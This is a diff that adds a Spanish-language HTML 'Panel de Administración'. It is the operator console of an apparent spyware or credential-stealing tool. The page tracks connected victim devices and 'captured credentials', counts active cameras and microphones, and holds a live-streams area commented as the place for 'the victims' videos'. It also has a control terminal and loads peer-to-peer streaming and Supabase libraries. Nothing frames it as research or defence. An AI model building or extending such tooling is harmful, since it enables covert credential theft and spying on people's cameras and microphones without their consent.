@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Panel de Administración</title>
+    <link rel="stylesheet" href="css/admin.css">
+</head>
+
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>PANEL DE ADMINISTRACIÓN</h1>
+            <div class="status">
+                <span class="status-indicator active"></span>
+                <span>Sistema Activo</span>
+            </div>
+        </div>
+
+        <div class="dashboard">
+            <div class="stats">
+                <div class="stat-item">
+                    <span class="stat-label">Dispositivos Conectados</span>
+                    <span class="stat-value" id="device-count">0</span>
+                </div>
+                <div class="stat-item">
+                    <span class="stat-label">Credenciales Capturadas</span>
+                    <span class="stat-value" id="credentials-count">0</span>
+                </div>
+                <div class="stat-item">
+                    <span class="stat-label">Cámaras Activas</span>
+                    <span class="stat-value" id="camera-count">0</span>
+                </div>
+                <div class="stat-item">
+                    <span class="stat-label">Micrófonos Activos</span>
+                    <span class="stat-value" id="mic-count">0</span>
+                </div>
+            </div>
+
+            <div class="device-list">
+                <h2>Dispositivos Monitoreados (Activos)</h2>
+                <div id="devices-container"></div>
+            </div>
+
+            <div class="credentials-list" style="margin-top: 20px;">
+                <h2>Credenciales Capturadas</h2>
+                <div id="credentials-container" style="background: #001100; border: 1px solid #0f0; border-radius: 4px; max-height: 200px; overflow-y: auto; padding: 10px;">
+                    <p style="color: #666; font-style: italic;">Sin credenciales capturadas aún.</p>
+                </div>
+            </div>
+
+            <div class="media-streams" id="media-streams" style="margin-top: 20px; display: none;">
+                <h2>Streams en Vivo</h2>
+                <div style="display: flex; gap: 10px; flex-wrap: wrap;" id="streams-container">
+                    <!-- Los videos de las victimas irán aquí -->
+                </div>
+            </div>
+        </div>
+
+        <div class="terminal">
+            <div class="terminal-header">
+                <span>Terminal de Control</span>
+                <button id="clear-terminal">Limpiar</button>
+            </div>
+            <div class="terminal-body" id="terminal"></div>
+        </div>
+    </div>
+
+    <script src="https://unpkg.com/simple-peer@9.11.1/simplepeer.min.js"></script>
+    <script src="https://unpkg.com/@supabase/supabase-js@2"></script>
+    <script src="js/config.js"></script>
+    <script src="js/admin.js"></script>
+</body>
+
+</html>
